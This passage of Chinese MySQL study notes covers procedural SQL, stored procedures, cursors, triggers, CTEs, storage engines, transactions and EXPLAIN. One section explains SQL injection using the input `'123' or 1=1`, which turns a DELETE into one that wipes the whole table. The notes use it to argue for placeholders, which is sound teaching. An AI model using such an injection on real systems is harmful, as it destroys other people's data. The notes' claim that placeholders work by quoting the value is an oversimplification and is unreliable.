命令的时候，不但可以显示表的信息，同时也可以显示视图的信息。\t\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220408183028.png)\n\n如果需要查询某个视图的定义，可以使用 SHOW CREATE VIEW 命令进行查看 ： \n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220408183038.png)\n\n**删除视图**\n语法 : \n```sql\nDROP VIEW [IF EXISTS] view_name [, view_name] ...[RESTRICT | CASCADE]\t\n```\n示例 , 删除视图city_country_view :\n```sql\nDROP VIEW city_country_view ;\n```\n\n#  select语句中case when例子介绍\n实例二：\n```sql\nSELECT\n    CASE parent_id\nWHEN 0 THEN\n    '00'\nWHEN 1 THEN\n    '11'\nELSE\n    'OTHERS'\nEND AS parent_id_new ,\nparent_id ,\ntype_id ,\ntype_name\nFROM\n    tdb_goods_types\n```\n\n实例一：\n```sql\nSELECT\n    CASE\nWHEN parent_id < 3 THEN\n    '<3'\nWHEN parent_id >= 3\nAND parent_id < 5 THEN\n    '>=3 && <5'\nELSE\n    '>=5'\nEND AS parent_id_new ,\nparent_id ,\ntype_id ,\ntype_name\nFROM\n    tdb_goods_types\n```\n\n\n# 过程化sql\n## 变量\n过程sql中的变量可分为如下两类：\n- 系统变量：全局变量、会话变量; \n- 自定义变量：用户变量、局部变量;  \n\n### 系统变量\n- 查看所有的系统变量：`show [global|session] variables`\n- 查看满足条件的部分系统变量：`show [global|session] variables like '%char%'`\n- 查看指定的某个系统变量：`show [@@global|session].系统变量名`\n- 为某个系统变量赋值\n  - `set [global|session] 系统变量名 = 值`\n  - `set [@@global|session].系统变量名 = 值` \n\n全局变量作用域：服务器每次启动时将所有的全局变量赋初始值，针对于所有的会话有效，但不能跨重启\n\n### 自定义变量\n**用户变量**\n使用用户变量时，需要加@，且一个变量加了@, 则表示该变量为用户变量\n\n- 作用域：针对于当前会话有效\n- 声明：`set @用户变量名=值`， `set @用户变量名:=值`， `select @用户变量名:=值`\n- 赋值：可用声明的方式来赋值， 或者`select 字段 into @变量名 from 表名`\n- 查值: `select @用户变量`\n\n**用户变量的高级使用**\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220408183047.png)\n\n**局部变量**\n- 作用域：仅仅在定义它的begin end中有效，并且应声明在begin end中的第一句\n- 声明：\n  - `declare 变量名 类型`\n  - `declare 变量名 类型 default 值`\n- 赋值:\n  - `set 局部变量名=值`\n  - `set 局部变量名:=值`\n  - `select 字段 into 局部变量名 from 表名`\n- 查值: `select 局部变量名`\n\n<font color='red'>注意自定义变量赋值符号，使用set时可以用“=”或“：=”，但是使用select时必须用“：=赋值”</font>\n\n\n## IF语句\n语法结构 : \n```sql\nif 条件 then\n     sql语句\nelseif 条件 then\n     sql语句\nelse\n     sql语句\t\nend if;\n```\n需求： \n```\n根据定义的身高变量，判定当前身高的所属的身材类型 \n\t180 及以上 ----------> 身材高挑\n\t170 - 180  ---------> 标准身材\n\t170 以下  ----------> 一般身材\n```\n示例 : \n```sql\ncreate procedure pro_test6()\nbegin\n  declare  height  int  default  175; \n  declare  description  varchar(50);\n  \n  if  height >= 180  then\n    set description = '身材高挑';\n  elseif height >= 170 and height < 180  then\n    set description = '标准身材';\n  else\n    set description = '一般身材';\n  end if;\n  \n  select description ;\nend$\n```\n\n## case结构\n语法结构 : \n```SQL\n方式一 : \nCASE 变量名\n  WHEN 值1 THEN sql语句\n  WHEN 值2 THEN sql语句\n  ELSE sql语句\nEND CASE;\n\n方式二 : \nCASE\n  WHEN 条件 THEN sql语句\n  WHEN 条件 THEN sql语句\n  ELSE sql语句\nEND CASE;\n```\n\n需求:\n```\n给定一个月份, 然后计算出所在的季度\n```\n示例  :\n```sql\ncreate procedure pro_test9(month int)\nbegin\n  declare result varchar(20);\n  case \n    when month >= 1 and month <=3 then \n      set result = '第一季度';\n    when month >= 4 and month <=6 then \n      set result = '第二季度';\n    when month >= 7 and month <=9 then \n      set result = '第三季度';\n    when month >= 10 and month <=12 then \n      set result = '第四季度';\n  end case;\n  \n  select concat('您输入的月份为 :', month , ' , 该月份为 : ' , result) as content ;\nend$\n```\n\n## while循环\n语法结构: \n```sql\nwhile 条件 do\n\tsql语句\nend while;\n```\n需求:\n```\n计算从1加到n的值\n```\n示例  : \n```sql\ncreate procedure pro_test8(n int)\nbegin\n  declare total int default 0;\n  declare num int default 1;\n  while num<=n do\n    set total = total + num;\n\tset num = num + 1;\n  end while;\n  select total;\nend$\n```\n\n## repeat结构\n有条件的循环控制语句, 当满足条件的时候退出循环 。while 是满足条件才执行，repeat 是满足条件就退出循环。\n语法结构 : \n```SQL\nREPEAT\n  sql语句\n  UNTIL 条件\nEND REPEAT;\n```\n\n需求: \n```\n计算从1加到n的值\n```\n\n示例  : \n```sql\ncreate procedure pro_test10(n int)\nbegin\n  declare total int default 0;\n  \n  repeat \n    set total = total + n;\n    set n = n - 1;\n    until n=0  \n  end repeat;\n  \n  select total ;\nend$\n```\n\n## loop语句\nLOOP 实现简单的循环，退出循环的条件需要使用其他的语句定义，通常可以使用 LEAVE 语句实现，具体语法如下：\n```sql\n[标签:] LOOP\n  sql语句\nEND LOOP [标签]\n```\n如果不在 statement_list 中增加`leave 标签`的语句，那么 LOOP 语句可以用来实现简单的死循环。\n\n## leave语句\n\n用来从标注的流程构造中退出，通常和 BEGIN ... END 或者循环一起使用。下面是一个使用 LOOP 和 LEAVE 的简单例子 , 退出循环：\n```SQL\nCREATE PROCEDURE pro_test11(n int)\nBEGIN\n  declare total int default 0;\n  \n  ins: LOOP\n    \n    IF n <= 0 then\n      leave ins;\n    END IF;\n    \n    set total = total + n;\n    set n = n - 1;\n  \t\n  END LOOP ins;\n  \n  select total;\nEND$\n```\n\n\n# 存储过程和函数\n存储过程和函数是  事先经过编译并存储在数据库中的一段 SQL 语句的集合，调用存储过程和函数可以简化应用开发人员的很多工作，减少数据在数据库和应用服务器之间的传输，对于提高数据处理的效率是有好处的。\t\n存储过程和函数的区别在于函数必须有返回值，而存储过程没有。\n-\t函数 ：必须要指定返回类型\n-\t过程 ：没有指定返回类型的函数\n\n## 创建存储过程\n```sql\nCREATE PROCEDURE 过程名 (参数...)\nbegin\n\t-- SQL语句\nend ;\n```\n注：mysql不支持如下创建存储过程方式\n```sql\ncreate or replace 过程名(参数...)\nbegin\n\t-- SQL语句\nend ;\n```\n\n示例 ：\n```sql \ndelimiter $\n\ncreate procedure pro_test1()\nbegin\n\tselect 'Hello Mysql' ;\nend$\n```\n`delimiter`的作用：该关键字用来声明SQL语句的分隔符 , 告诉 MySQL 解释器，该段命令是否已经结束了，mysql是否可以执行了。默认情况下，delimiter是分号;。在命令行客户端中，如果有一行命令以分号结束，那么回车后，mysql将会执行该命令。\n\n## 调用存储过程\n```sql\ncall procedure_name() ;\t\n```\n\n## 查看存储过程\n\n```sql\n-- 查询db_name数据库中的所有的存储过程\nselect name from mysql.proc where db='db_name';\n\n-- 查询存储过程的状态信息\nshow procedure status;\n\n-- 查询某个存储过程的定义\nshow create procedure test.pro_test1 \\G;\n```\n\n## 删除存储过程\n```sql\nDROP PROCEDURE  [IF EXISTS] sp_name ；\n```\n\n目前，MySQL还不提供对已存在的存储过程的代码修改\n\n## 传递参数\n语法格式 : \n```\ncreate procedure 过程名([in/out/inout] 参数名   参数类型)\n...\n\n\nIN :   该参数可以作为输入，也就是需要调用方传入值 , 默认\nOUT:   该参数作为输出，也就是该参数可以作为返回值\nINOUT: 既可以作为输入参数，也可以作为输出参数\n```\n\n**IN - 输入**\n需求 :\n```\n根据定义的身高变量，判定当前身高的所属的身材类型 \n```\n\n示例  : \n```sql\ncreate procedure pro_test5(in height int)\nbegin\n    declare description varchar(50) default '';\n  if height >= 180 then\n    set description='身材高挑';\n  elseif height >= 170 and height < 180 then\n    set description='标准身材';\n  else\n    set description='一般身材';\n  end if;\n  select concat('身高 ', height , '对应的身材类型为:',description);\nend$\n```\n**OUT-输出**\n需求 :\n```\n根据传入的身高变量，获取当前身高的所属的身材类型  \n```\n\n示例:\n```SQL \ncreate procedure pro_test5(in height int , out description varchar(100))\nbegin\n  if height >= 180 then\n    set description='身材高挑';\n  elseif height >= 170 and height < 180 then\n    set description='标准身材';\n  else\n    set description='一般身材';\n  end if;\nend$\t\n```\n\n调用:\n```\ncall pro_test5(168, @description)$\n\nselect @description$\n```\n\n\n## 游标/光标\n游标是用来存储查询结果集的数据类型 , 在存储过程和函数中可以使用光标对结果集进行循环的处理。光标的使用包括光标的声明、OPEN、FETCH 和 CLOSE，其语法分别如下。\n**声明光标：**\n```sql\nDECLARE 光标名 CURSOR FOR sql查询语句 ;\n```\n\n**OPEN 光标：**\n```sql\nOPEN 光标名 ;\n```\n\n**FETCH 光标：**\n获取游标当前指针的记录，并传给指定变量列表,**注意变量数必须与MySQL游标返回的字段数一致， 每执行一次fetch操作，光标就会向下移动一行**\n当游标已经指向最后一行时继续执行会造成游标溢出。\n```sql\nFETCH 光标名 INTO  变量名...\n```\n\n**CLOSE 光标：**\n```sql\nCLOSE 光标名;\n```\n\n示例 : \n初始化脚本:\n``` sql\ncreate table emp(\n  id int(11) not null auto_increment ,\n  name varchar(50) not null comment '姓名',\n  age int(11) comment '年龄',\n  salary int(11) comment '薪水',\n  primary key(`id`)\n)engine=innodb default charset=utf8 ;\n\ninsert into emp(id,name,age,salary) values(null,'金毛狮王',55,3800),(null,'白眉鹰王',60,4000),(null,'青翼蝠王',38,2800),(null,'紫衫龙王',42,1800);\n```\n\n``` SQL\n-- 查询emp表中数据, 并逐行获取进行展示\ncreate procedure pro_test11()\nbegin\n  declare e_id int(11);\n  declare e_name varchar(50);\n  declare e_age int(11);\n  declare e_salary int(11);\n  declare emp_result cursor for select * from emp;\n  \n  open emp_result;\n  \n  fetch emp_result into e_id,e_name,e_age,e_salary;\n  select concat('id=',e_id , ', name=',e_name, ', age=', e_age, ', 薪资为: ',e_salary);\n  \n  fetch emp_result into e_id,e_name,e_age,e_salary;\n  select concat('id=',e_id , ', name=',e_name, ', age=', e_age, ', 薪资为: ',e_salary);\n  \n  fetch emp_result into e_id,e_name,e_age,e_salary;\n  select concat('id=',e_id , ', name=',e_name, ', age=', e_age, ', 薪资为: ',e_salary);\n\n  close emp_result;\nend$\n```\n\n**通过循环结构 , 获取游标中的数据**\n在MySql中，造成游标溢出时会引发mysql预定义的NOT FOUND错误，所以在上面使用下面的代码指定了当引发not found错误时定义一个continue 的事件，指定这个事件发生时修改done变量的值。\n```sql\ndeclare continue HANDLER for not found set done = true;  \n```\n所以在循环时加上了下面这句代码：\n```sql\n--判断游标的循环是否结束  \nif done then  \n    leave read_loop;    --跳出游标循环  \nend if;  \n```\n实例：\n```sql\ncreate procedure pro_test12()\nbegin\n  DECLARE id int(11);\n  DECLARE name varchar(50);\n  DECLARE age int(11);\n  DECLARE salary int(11);\n  DECLARE has_data int default 1;\n  \n  DECLARE emp_result CURSOR FOR select * from emp;\n  DECLARE EXIT HANDLER FOR NOT FOUND set has_data = 0;\n  \n  open emp_result;\n  \n  repeat\n    fetch emp_result into id , name , age , salary;\n    select concat('id为',id, ', name 为' ,name , ', age为 ' ,age , ', 薪水为: ', salary);\n    until has_data = 0\n  end repeat;\n  \n  close emp_result;\nend$\n```\n\n\n\n## 存储函数\n\n语法结构:\n``` \nCREATE FUNCTION 函数名([参数名 参数类型 ... ]) \nRETURNS 类型名(如int) \nBEGIN\n\t...\nEND;\n```\n\n案例 : \n定义一个存储函数, 请求满足条件的总记录数 ;\n```SQL\ncreate function count_city(countryId int)\nreturns int\nbegin\n  declare cnum int ;\n  \n  select count(*) into cnum from city where country_id = countryId;\n  \n  return cnum;\nend$\n```\n\n调用: \n```\nselect count_city(1);\nselect count_city(2);\n```\n\n# 触发器\n触发器是与表有关的数据库对象，指在 insert/update/delete 之前或之后，触发并执行触发器中定义的SQL语句集合。触发器的这种特性可以协助应用在数据库端确保数据的完整性 , 日志记录 , 数据校验等操作 。\n\n使用别名OLD和NEW关键字 来引用触发器中发生变化的记录内容，这与其他的数据库是相似的。现在触发器还只支持行级触发，不支持语句级触发。\n| 触发器类型      | NEW 和 OLD的使用                                        |\n| --------------- | ------------------------------------------------------- |\n| INSERT 型触发器 | NEW 表示将要或者已经新增的数据                          |\n| UPDATE 型触发器 | OLD 表示修改之前的数据 , NEW 表示将要或已经修改后的数据 |\n| DELETE 型触发器 | OLD 表示将要或者已经删除的数据                          |\n\n## 创建触发器\n语法结构 : \n```sql\ncreate trigger 触发器名 \nbefore/after insert/update/delete\non 表名 \n[ for each row ]  -- 加上这句话表明为行级触发器\nbegin\n\t sql语句\nend;\n```\n\n示例 \n需求\n```\n通过触发器记录 emp 表的数据变更日志 , 包含增加, 修改 , 删除 ;\n```\n首先创建一张日志表 : \n```sql\ncreate table emp_logs(\n  id int(11) not null auto_increment,\n  operation varchar(20) not null comment '操作类型, insert/update/delete',\n  operate_time datetime not null comment '操作时间',\n  operate_id int(11) not null comment '操作表的ID',\n  operate_params varchar(500) comment '操作参数',\n  primary key(`id`)\n)engine=innodb default charset=utf8;\n```\n\n创建 insert 型触发器，完成插入数据时的日志记录 : \n```sql\ncreate trigger emp_logs_insert_trigger\nafter insert \non emp \nfor each row \nbegin\n  insert into emp_logs (id,operation,operate_time,operate_id,operate_params) values(null,'insert',now(),new.id,concat('插入后(id:',new.id,', name:',new.name,', age:',new.age,', salary:',new.salary,')'));\t\nend $\n```\n\n创建 update 型触发器，完成更新数据时的日志记录 : \n``` sql\ncreate trigger emp_logs_update_trigger\nafter update \non emp \nfor each row \nbegin\n  insert into emp_logs (id,operation,operate_time,operate_id,operate_params) values(null,'update',now(),new.id,concat('修改前(id:',old.id,', name:',old.name,', age:',old.age,', salary:',old.salary,') , 修改后(id',new.id, 'name:',new.name,', age:',new.age,', salary:',new.salary,')'));                                                                      \nend $\n```\n\n创建delete 行的触发器 , 完成删除数据时的日志记录 : \n```sql\ncreate trigger emp_logs_delete_trigger\nafter delete \non emp \nfor each row \nbegin\n  insert into emp_logs (id,operation,operate_time,operate_id,operate_params) values(null,'delete',now(),old.id,concat('删除前(id:',old.id,', name:',old.name,', age:',old.age,', salary:',old.salary,')'));                                                                      \nend $\n```\n\n测试：\n```sql\ninsert into emp(id,name,age,salary) values(null, '光明左使',30,3500);\ninsert into emp(id,name,age,salary) values(null, '光明右使',33,3200);\n\nupdate emp set age = 39 where id = 3;\ndelete from emp where id = 5;\n```\n\n## 删除触发器\n语法结构 : \n```sql\ndrop trigger [schema_name.]trigger_name\n```\n如果没有指定 schema_name，默认为当前数据库 。\n\n## 查看触发器\n可以通过执行 SHOW TRIGGERS 命令查看触发器的状态、语法等信息。\n语法结构 ： \n```\nshow triggers ；\n```\n\n# case函数\ncase函数，流程控制函数。case函数有两个用法\n\ncase函数第一个用法的语法\n```sql\n\ncase value\n\nwhen compare_calue1 then result1\n\nwhen compare_calue2 then result2\n\n...\n\nelse result\n\nend\n```\n\ncase函数用value和后面的compare_value1、compare_value2、…依次进行比较，如果value和指定的compare_value1相等，则返回对应的result1，否则返回else后的result\n\ncase函数的第二个用法的语法\n```sql\n\ncase \n\nwhen condition1 then result1\n\nwhere condition2 then result2\n\n...\n\nelse result\n\nend\n```\n\ncondition返回boolean值的条件表达式\n\n```sql\n--id小于3的为初级工程师，3~6为中级工程师，其他为高级工程师 \n\nselect name, case\n\nwhen id<=3 then '初级工程师 '\n\nwhen id <=6 then '中级工程师 '\n\nelse '高级工程师' \n\nend \n\nfrom tableName;\n```\n\n# with as用法\n## With As介绍\nWITH AS短语，也叫做子查询部分（subquery factoring），可以让你做很多事情，定义一个SQL片断，该SQL片断会被整个SQL语句所用到。有的时候，是为了让SQL语句的可读性更高些，也有可能是在UNION ALL的不同部分，作为提供数据的部分。 \n\n特别对于UNION ALL比较有用。因为UNION ALL的每个部分可能相同，但是如果每个部分都去执行一遍的话，则成本太高，所以可以使用WITH AS短语，则只要执行一遍即可。如果WITH AS短语所定义的表名被调用两次以上，则优化器会自动将WITH AS短语所获取的数据放入一个TEMP表里，如果只是被调用一次，则不会。而提示materialize则是强制将WITH AS短语里的数据放入一个全局临时表里。很多查询通过这种方法都可以提高速度。\n\n## WITH AS 语法\n```sql\n[ WITH <common_table_expression> [ ,n ] ] \n<common_table_expression>::= \n        expression_name [ ( column_name [ ,n ] ) ] \n    AS \n        ( CTE_query_definition ) \n```\n\n\n## With As使用方法\n我们数据库中有两个表，一个商品信息表tbSpXinXi，一个库存表tbSpKc。先看一下两个表的结构：\n\ntbSpXinXi\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220322210347.png)\n\ntbSpKc\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220322210406.png)\n\n\n**我们要实现查商品名称最后一个字为\"茶\"的库存**\n\n最原始的写法，嵌套一个查询语句：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220322210430.png)\n\n用变量表名的方法：\n```sql\ndeclare @tb table(incode varchar(20))\ninsert into @tb(incode)\nselect incode from tbSpXinXi where fname like '%茶'\n\nselect * from tbSpKc where incode in (select * from @tb)\n```\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220322210504.png)\n\n接下来我们就直接换成With As的用法\n```sql\nwith row as \n    (    \n    select incode from tbSpXinXi where fname like '%茶'\n    )\nselect * from tbSpKc where incode in (select * from row)\n```\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220322210535.png)\n\n从上面来看，感觉用With As的语句比最原始的写法好像还麻烦了点，因为我这里举的例子只是为了让大家知道怎么用，使用这个可以组合很多类型。\n\n## With As使用时注意的问题\n\n1. With As后面必须直接跟使用With As的SQL语句（如select、insert、update等），否则，With As将失效。如下面的SQL语句将无法正常使用With As。\n```sql\nwith row as \n    (    \n    select incode from tbSpXinXi where fname like '%茶'\n    )\nselect * from tbGysXinXi  -- 加上这句下面的row就失效了 \n--使用row必须跟在with row as的后面\nselect * from tbSpKc where incode in (select * from row)\n```\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220322210613.png)\n\n2. With As后面也可以跟其他的As，但只能使用一个With，多个With As中间用逗号（,）分隔。\n```sql\nwith xinxi as \n    (    \n    select incode,fname from tbSpXinXi where fname like '%茶'\n    ),\n    kc as \n    (\n    select * from tbSpKc where 1=1\n    )\n    \nselect * from xinxi a,kc b where a.incode=b.incode\n```\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220322210642.png)\n\n3. 如果With As的表达式名称与某个数据表或视图重名，则紧跟在该With As后面的SQL语句使用的仍然是With As的名称，当然，后面的SQL语句使用的就是数据表或视图了\n```sql\nwith tbSpKc as \n    (    \n    select * from tbSpXinXi where incode='14004015'\n    )\nselect * from tbSpKc  -- 使用了名为tbSpKc的公共表表达式 \nselect * from tbSpKc  -- 原来的tbSpKc表\n```\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220322210707.png)\n\n4. With As可以引用自身，也可以引用在同一 WITH 子句中预先定义的 公共表达式。但不允许前向引用。 \n\n5. 不能在 CTE_query_definition 中使用以下子句： \n- COMPUTE 或 COMPUTE BY\n- ORDER BY（除非指定了 TOP 子句）\n- INTO\n- 带有查询提示的 OPTION 子句\n- FOR XML\n- FOR BROWSE\n\n6. 如果将 With As用在属于批处理的一部分的语句中，那么在它之前的语句必须以分号结尾。\n```sql\ndeclare @fname varchar(20)\nselect @fname='%茶'\n;with xinxi as --这里前面必须加分号\n    (    \n    select incode from tbSpXinXi where fname like @fname\n    )\nselect * from tbSpKc where incode in (select * from xinxi) \n```\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220322210744.png)\n\n# MyISAM与InnoDB\nMySQL5.5版本开始Innodb已经成为Mysql的默认引擎(之前是MyISAM)\n可以通过`show variables like '%engine%'`语句来查看当前sql引擎 \n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220408183056.png)\n\n\n## 区别\n1. InnoDB支持事务，MyISAM不支持，对于InnoDB每一条SQL语言都默认封装成事务，自动提交，这样会影响速度，所以最好把多条SQL语言放在begin和commit之间，组成一个事务； \n2. InnoDB支持外键，而MyISAM不支持。对一个包含外键的InnoDB表转为MYISAM会失败； \n3.  InnoDB是聚集索引，使用B+Tree作为索引结构，数据文件是和（主键）索引绑在一起的（表数据文件本身就是按B+Tree组织的一个索引结构），必须要有主键，通过主键索引效率很高。但是辅助索引需要两次查询，先查询到主键，然后再通过主键查询到数据。因此，主键不应该过大，因为主键太大，其他索引也都会很大。MyISAM是非聚集索引，也是使用B+Tree作为索引结构，索引和数据文件是分离的，索引保存的是数据文件的指针。主键索引和辅助索引是独立的。\n也就是说：InnoDB的B+树主键索引的叶子节点就是数据文件，辅助索引的叶子节点是主键的值；而MyISAM的B+树主键索引和辅助索引的叶子节点都是数据文件的地址指针。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220408183104.png)\n\n4. InnoDB不保存表的具体行数，执行`select count(*) from table`时需要全表扫描。而MyISAM用一个变量保存了整个表的行数，执行上述语句时只需要读出该变量即可，速度很快（注意不能加有任何WHERE条件）\n5. Innodb不支持全文索引，而MyISAM支持全文索引，在涉及全文索引领域的查询效率上MyISAM速度更快高；PS：5.7以后的InnoDB支持全文索引了\n6. MyISAM表格可以被压缩后进行查询操作\n7. InnoDB支持表、行(默认)级锁，而MyISAM只支持表级锁\n8. InnoDB表必须有唯一性索引（如主键）（用户没有指定的话会自己找/生产一个隐藏列Row_id来充当默认主键），而Myisam可以没有\n9. Innodb存储文件有frm、ibd，而Myisam是frm、MYD、MYI\nInnodb：frm是表定义文件，ibd是数据文件\nMyisam：frm是表定义文件，myd是数据文件，myi是索引文件\n\n## 如何选择：\n- 是否要支持事务，如果要请选择innodb，如果不需要可以考虑MyISAM；\n- 如果表中绝大多数都只是读查询，可以考虑MyISAM，如果既有读也有写，请使用InnoDB。\n- 系统奔溃后，MyISAM恢复起来更困难，能否接受；\n\n## InnoDB为什么推荐使用自增ID作为主键？\n自增ID可以保证每次插入时B+索引是从右边扩展的，可以避免B+树和频繁合并和分裂（对比使用UUID）。如果使用字符串主键和随机主键，会使得数据随机插入，效率比较差。\n\n## innodb引擎的4大特性\n插入缓冲（insert buffer),二次写(double write),自适应哈希索引(ahi),预读(read ahead)\n\n# 数据库中为什么不推荐使用外键约束\n首先我们明确一点，外键约束是一种约束，这个约束的存在，会保证表间数据的关系“始终完整”。因此，外键约束的存在，并非全然没有优点。\n比如使用外键，可以\n- 保证数据的完整性和一致性\n- 级联操作方便\n- 将数据完整性判断托付给了数据库完成，减少了程序的代码量\n\n然而，鱼和熊掌不可兼得。外键是能够保证数据的完整性，但是会给系统带来很多缺陷。正是因为这些缺陷，才导致我们不推荐使用外键，具体如下\n\n## 性能问题\n假设一张表名为user_tb。那么这张表里有两个外键字段，指向两张表。那么，每次往user_tb表里插入数据，就必须往两个外键对应的表里查询是否有对应数据。如果交由程序控制，这种查询过程就可以控制在我们手里，可以省略一些不必要的查询过程。但是如果由数据库控制，则是必须要去这两张表里判断。\n\n## 并发问题\n在使用外键的情况下，每次修改数据都需要去另外一个表检查数据,需要获取额外的锁。若是在高并发大流量事务场景，使用外键更容易造成死锁。\n\n## 扩展性问题\n这里主要是分为两点\n- 做平台迁移方便，比如你从Mysql迁移到Oracle，像触发器、外键这种东西，都可以利用框架本身的特性来实现，而不用依赖于数据库本身的特性，做迁移更加方便。\n- 分库分表方便，在水平拆分和分库的情况下，外键是无法生效的。将数据间关系的维护，放入应用程序中，为将来的分库分表省去很多的麻烦。\n\n## 技术问题\n使用外键，其实将应用程序应该执行的判断逻辑转移到了数据库上。那么这意味着一点，数据库的性能开销变大了，那么这就对DBA的要求就更高了。很多中小型公司由于资金问题，并没有聘用专业的DBA，因此他们会选择不用外键，降低数据库的消耗。\n相反的，如果该约束逻辑在应用程序中，发现应用服务器性能不够，可以加机器，做水平扩展。如果是在数据库服务器上，数据库服务器会成为性能瓶颈，做水平扩展比较困难。\n\n## 总结\n不在数据库声明FK，在程序实现上表达关联\n\n# 为什么占位符能防止sql注入\n## 非占位符方式 --> 对应mybatis中的${}\n前端页面传入后端什么,就直接放入最终的sql语句中,<font color=\"red\">不做任何处理</font>\n```sql\ndelete from userTable t where t.id = ${id}\n```\n用户正常操作, 传入'123',对应sql为： \n```sql\ndelete from userTable t where  t.id='123' \n```\n黑客破坏性操作,修改查询条件,传入'123' or 1=1, 删掉所有人,对数据造成破坏\n```sql\ndelete from userTable t where  t.id='123' or 1=1\n```\n\n## 占位符方式 ---->对应mybatis中的 #{}\n前端页面传入后端后,在放入最终的sql语句中之前,需要做处理,<font color=\"red\">给参数用'单引号括起来</font>\n```sql\ndelete from userTable t where t.id=?\n```\n用户正常操作,传入123, 删掉一个人\n```sql\ndelete from userTable t where  t.id='123' \n```\n黑客破坏性操作,修改查询条件,传入'123' or 1=1,不会对数据库造成破坏\n```sql\ndelete from userTable t where  t.id='123 or 1=1'\n```\n\n# Mysql InnoDB存储引擎中的事务\n**如何开启事务**\n- 执行DML语句时，会自动开启事务\n- 使用`begin`或`start transaction`命令来手动开启事务\n\n**如何结束事务**\n- 执行DML语句时，会自动提交(commit)事务\n- 使用`rollback`或`commit`命令使用结束事务\n\n## 事务隔离级别\nSQL92 ANSI/ISO标准中给出了数据库开发者开发数据库时，该数据库中的事务应该含有如下4种隔离级别供用户选择\n- `Read Uncommitted(未提交读)`：没有解决任何并发问题；事务未提交的数据对其他事务也是可见的，会出现脏读\n- `Read Committed(已提交读)`：解决脏读问题；但一个事务开始之后，只能看到已提交的事务所做的修改，会出现不可重复读\n- `Repeatable Read(可重复读)`：解决不可重复读问题，在同一个事务中多次读取同样的数据结果是一样的；但这种隔离级别未定义解决幻读的问题\n- `Serializable(串行化)`：解决所有问题，是最高的隔离级别，通过强制事务的串行执行\n\n注：以上只是ANSI/ISO标准建议数据库开发者这样开发数据库，但真正的实现还是要看数据库开发者；\n\n### MySQL InnoDB中事务隔离级别\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220408183114.png)\n\n注：在mysql InnoDB中，`Repeatable Read`就解决了幻读的问题\n\n可以通过`sow global variables like 'tx_isolation'`语句来查看当前使用的事务隔离级别\n\n \n# 查询结果中增加一个字段并指定固定值\n```mysql\nmysql> select * from user;\n+----+------+\n| id | name |\n+----+------+\n|  1 | abc  |\n|  2 | xyz  |\n+----+------+\n2 rows in set (0.00 sec)\n\nmysql> select *,\"true\" as is_person from user;\n+----+------+-----------+\n| id | name | is_person |\n+----+------+-----------+\n|  1 | abc  | true |\n|  2 | xyz  | true |\n+----+------+-----------+\n2 rows in set (0.00 sec)\n```\n\n# 单表访问方法\n# EXPLAIN解释命令\n## EXPLAIN概念\nEXPLAIN会向我们提供一些MySQL是执行sql的信息：\n- EXPLAIN可以解释说明 SELECT, DELETE, INSERT, REPLACE, and UPDATE 等语句.\n- 当EXPLAIN与可解释的语句一起使用时，mysql会显示一些来自于优化器的关于sql执行计划的信息。即mysql解释它是如何处理这些语句的，和表之间是如何连接的。想获取更多关于EXPLAIN如何获取执行计划信息的。\n- 当EXPLAIN后面是一个会话的connection_id 而不是一个可执行的语句时，它会展示会话的信息。\n- 对于SELECT语句，EXPLAIN会产生额外的执行计划信息，这些信息可以用SHOW WARNINGS显示出来。\n- EXPLAIN对于检查设计分区表的查询时非常有用。\n- FORMAT选项可以用于选择输出格式，如果没有配置FORMAT选项，默认已表格形式输出。JSON 选项让信息已json格式展示。\n\n## EXPLAIN 输出列信息\nEXPLAIN输出的字段信息\n第一列:列名, 第二列:FORMAT = JSON时输出中显示的等效属性名称 ,第三列：字段含义\n\n| Column        | JSON Name     | Meaning                                         |\n| ------------- | ------------- | ----------------------------------------------- |\n| id            | select_id     | select标识号                                    |\n| select_type   | None          | select类型                                      |\n| table         | table_name    | 这一行数据是关于哪张表的                        |\n| partitions    | partitions    | 匹配的分区，对于未分区表，该值为空              |\n| type          | access_type   | 使用的连接类别,有无使用索引                     |\n| possible_keys | possible_keys | MySQL能使用哪个索引在该表中找到行               |\n| key           | key           | MySQL实际决定使用的键（索引）                   |\n| key_len       | key_length    | MySQL决定使用的键长度。如果键是NULL，长度为NULL |\n| ref           | ref           | 与索引关联的列                                  |\n| rows          | rows          | mysql认为执行sql时必须被校验的行数              |\n| filtered      | filtered      | 表示此查询条件所过滤的数据的百分比              |\n| Extra         | None          | 附加信息                                        |\n\n## id\nSELECT标识符。SELECT在查询中的序列号，可以为空。\n\n## select_type\nSELECT类型，所有类型在下表中展示，JSON格式的EXPLAIN将SELECT类型公开为query_block的属性，除非它是SIMPLE或PRIMARY。 JSON名称(不适用为None)也显示在表中。\n\n| select_type          | Value                      | JSON Name\tMeaning                                                        |\n| -------------------- | -------------------------- | ------------------------------------------------------------------------ |\n| SIMPLE               | None                       | 简单SELECT(不使用UNION或子查询等)                                        |\n| PRIMARY              | None                       | 嵌套查询时最外层的查询                                                   |\n| UNION                | None                       | UNION中的第二个或后面的SELECT语句                                        |\n| DEPENDENT UNION      | dependent (true)           | UNION中的第二个或以后的SELECT语句，取决于外部查询                        |\n| UNION RESULT         | union_result               | UNION的结果                                                              |\n| SUBQUERY             | None                       | 子查询中的第一个选择                                                     |\n| DEPENDENT SUBQUERY   | dependent (true)           | 子查询中的第一个选择，取决于外部查询                                     |\n| DERIVED              | None                       | 派生表（子查询中产生的临时表）                                           |\n| MATERIALIZED         | materialized_from_subquery | 物化子查询                                                               |\n| UNCACHEABLE SUBQUERY | cacheable (false)          | 无法缓存结果的子查询，必须对外部查询的每一行进行重新计算                 |\n| UNCACHEABLE UNION    | cacheable (false)          | UNION中属于不可缓存子查询的第二个或以后的选择(请参 UNCACHEABLE SUBQUERY) |\n\n### 实例\n表信息（后面演示用）：\n```sql\nmysql> show create table t_a;\n------+\n| t_a   | CREATE TABLE `t_a` (\n  